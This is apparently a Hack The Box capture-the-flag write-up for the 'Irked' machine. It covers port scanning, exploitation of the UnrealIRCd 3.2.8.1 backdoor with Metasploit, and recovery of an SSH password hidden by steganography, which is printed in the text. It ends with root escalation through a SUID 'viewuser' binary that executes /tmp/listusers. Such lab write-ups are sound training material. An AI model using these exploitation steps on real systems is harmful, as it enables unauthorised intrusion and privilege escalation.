![Pasted image 20230720161816](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/3129a024-7047-4417-a1c2-27e7f98a6051)

# Enumeration

```nmap
Nmap scan report for 10.129.161.245
Host is up (0.010s latency).
Not shown: 65528 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a5df5bdcf8378b675319bdc79c5fdad (DSA)
|   2048 752e66bfb93cccf77e848a8bf0810233 (RSA)
|   256 c8a3a25e349ac49b9053f750bfea253b (ECDSA)
|_  256 8d1b43c7d01a4c05cf82edc10163a20c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          39558/udp   status
|   100024  1          42014/tcp6  status
|   100024  1          47508/udp6  status
|_  100024  1          48637/tcp   status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
48637/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 21:25
Completed NSE at 21:25, 0.00s elapsed
Initiating NSE at 21:25
Completed NSE at 21:25, 0.00s elapsed
Initiating NSE at 21:25
Completed NSE at 21:25, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 185.02 seconds

```
There is a lot of strange ports here. 
Web page shows just a face and "IRC is almost working!"
The nmap scan mentioned IRC ports. I'll check those out...
ports 8067 and 65534 show the same thing:
```
:irked.htb NOTICE AUTH :*** Looking up your hostname...
:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
:irked.htb 451 GET :You have not registered
:irked.htb 451 Host: :You have not registered
:irked.htb 451 User-Agent: :You have not registered
:irked.htb 451 Accept: :You have not registered
:irked.htb 451 Accept-Language: :You have not registered
:irked.htb 451 Accept-Encoding: :You have not registered
:irked.htb 451 DNT: :You have not registered
:irked.htb 451 Connection: :You have not registered
:irked.htb 451 Upgrade-Insecure-Requests: :You have not registered
:irked.htb 451 Sec-GPC: :You have not registered
ERROR :Closing Link: [10.10.14.75] (Ping timeout)
```
So that's fun... Might need to join with a real irc client. 

# Foothold

Digging around, I found an IRC client I can use via commandline called `irssi`
After installing it, I can try and connect to the IRC channel ports listed... 

`irssi -c 10.129.161.245 --port 8067`

![Pasted image 20230720163633](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/f37d8197-22e9-46cd-bde3-5b3e76d07e83)

I can see that we are running unreal3.2.8.1
Searching online shows there is a metasploit module for it. 
Running metasploit:
```
[msf](Jobs:0 Agents:0) exploit(unix/irc/unreal_ircd_3281_backdoor) >> run

[*] 10.129.161.245:65534 - Connected to 10.129.161.245:65534...
    :irked.htb NOTICE AUTH :*** Looking up your hostname...
[*] 10.129.161.245:65534 - Sending backdoor command...
[*] Started bind TCP handler against 10.129.161.245:4444
whoami
[*] Command shell session 1 opened (10.10.14.75:46617 -> 10.129.161.245:4444) at 2023-07-20 21:44:32 +0100

ircd
id
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
```
So that's cool!
I decided to spawn a reverse shell using netcat because I couldn't navigate directories in metasploit. 

# Escalation (lateral movement)
I can see that there is a user flag in the home directory for djmardov, but I can't read it. I probably need to get that user next. I can view their directory and see what's in it, though:
```
ircd@irked:/home/djmardov/Documents$ ls -la
total 12
drwxr-xr-x  2 djmardov djmardov 4096 Sep  5  2022 .
drwxr-xr-x 18 djmardov djmardov 4096 Sep  5  2022 ..
-rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup
lrwxrwxrwx  1 root     root       23 Sep  5  2022 user.txt -> /home/djmardov/user.txt
ircd@irked:/home/djmardov/Documents$
```
There's a hidden backup file that I can read, which is cool. Let's try that!
```
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```
I don't think they mean stegosaurus. Most likely steganogrophy which means they hid something in an image somewhere. The only image I can find is the one on the web page so I'll dig through that... 
There's a tool called `stegcracker` that might work:
```
─[us-dedivip-1]─[10.10.14.75]─[htb-th1stle@htb-6v2z1kwcbf]─[~]
└──╼ [★]$ stegcracker irked.jpg steg.txt 
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2023 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which 
will blast through the rockyou.txt wordlist within 1.9 second as opposed 
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

Counting lines in wordlist..
Attacking file 'irked.jpg' with wordlist 'steg.txt'..
Successfully cracked file with password: UPupDOWNdownLRlrBAbaSSss
Tried 1 passwords
Your file has been written to: irked.jpg.out
UPupDOWNdownLRlrBAbaSSss
┌─[us-dedivip-1]─[10.10.14.75]─[htb-th1stle@htb-6v2z1kwcbf]─[~]
└──╼ [★]$ cat irked.jpg.out 
Kab6h+m+bbp2J:HG
```
Looks like I cracked the password!
Let's see if that's the ssh login for the user:
```
$ ssh djmardov@10.129.162.98
djmardov@10.129.162.98's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May 15 08:56:32 2018 from 10.33.3.3
djmardov@irked:~$ whoami && id
djmardov
uid=1000(djmardov) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
djmardov@irked:~$
```
And there we go!

```
djmardov : Kab6h+m+bbp2J:HG
```

# Escalation (root)
I'll start with [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) and see what it finds...
Lots of info, but one thing does stick out:
![Pasted image 20230721111137](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/7d31c8d0-179b-4204-8c61-560febebf184)

Not sure what viewuser is... 
After playing with it, it is running as root, and reading from a file I made called 'listusers' and this is the output:
```
djmardov@irked:/tmp$ cat listusers 
hackerman was here!
root

id
djmardov@irked:/tmp$ viewuser 
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           Jul 21 10:34 (:0)
djmardov pts/1        Jul 21 10:56 (10.10.14.75)
/tmp/listusers: 1: /tmp/listusers: hackerman: not found
/tmp/listusers: 2: /tmp/listusers: root: not found
uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
djmardov@irked:/tmp$
```
It's only reading one line at a time and only running the first command... The `id` command is running as root so I can totally do stuff... 
Since it's running one command word at a time... can I to just use `sh`?
```
djmardov@irked:/tmp$ viewuser 
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           Jul 21 10:34 (:0)
djmardov pts/1        Jul 21 10:56 (10.10.14.75)
# whoami
root
# id
uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
```
Irked has been PWNED!
